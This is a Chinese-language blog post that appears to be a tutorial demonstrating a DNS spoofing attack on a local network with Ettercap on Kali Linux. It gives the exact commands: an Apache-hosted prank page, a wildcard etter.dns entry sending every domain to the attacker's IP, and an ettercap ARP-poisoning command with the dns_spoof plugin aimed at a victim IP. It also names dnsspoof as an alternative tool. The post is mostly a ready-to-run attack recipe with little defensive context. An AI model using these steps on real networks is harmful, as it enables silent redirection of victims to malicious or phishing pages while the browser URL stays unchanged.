---
layout: post
title: 演示DNS欺骗攻击
---

DNS欺骗攻击基于[中间人攻击](http://topspeedsnail.com/kali-linux-preform-man-in-middle-attack/)。攻击者更改受害者从DNS服务器查询的域名解析结果，给受害者发送恶意网页或钓鱼网页－浏览器依然显示正常的url。

本帖介绍怎么使用Ettercap施行DNS欺骗攻击，实现受害者访问任何网站都转向到攻击者指定的网站。

### 情形描述

* 同一局域网内
* 受害者IP：192.168.0.106
* 攻击者系统Kali Linux，IP地址：192.168.0.108

## 创建恶搞网站

在Kali Linux上创建恶搞网站。

**启动Apache：**

{% highlight shell %}
# service apache2 start
{% endhighlight %}

**创建恶搞网页：**

{% highlight shell %}
# vim /var/www/html/index.html
{% endhighlight %}

**写入内容：**

```
<h1>You Got Fucked!</h1>
```

你可以测试一下（http://192.168.0.108），看看Web是否可以正常提供服务。

## DNS欺骗攻击

编辑文件：

{% highlight shell %}
# vim /etc/ettercap/etter.dns
{% endhighlight %}

在文件中添加一行：

```
* A 192.168.0.108
```

所有域名查询都解析为Kali Linux的IP地址。

DNS欺骗／ARP欺骗：

{% highlight shell %}
# ettercap -i wlan0 -T -P dns_spoof -M arp /192.168.0.106///
{% endhighlight %}

![演示DNS欺骗攻击]({{ site.baseurl }}/images/2016/5/Screenshot from 2016-05-18 18-37-15.png)

## 测试

受害者访问网站：

![演示DNS欺骗攻击]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-18 at 18.42.13.png)

注意：地址栏的URL并没有变

你也可以使用nslookup命令查询DNS解析结果：

```
nslookup www.baidu.com
```

***

Kali Linux中另一个执行这种攻击的工具：dnsspoof。

{% highlight shell %}
# man dnsspoof
{% endhighlight %}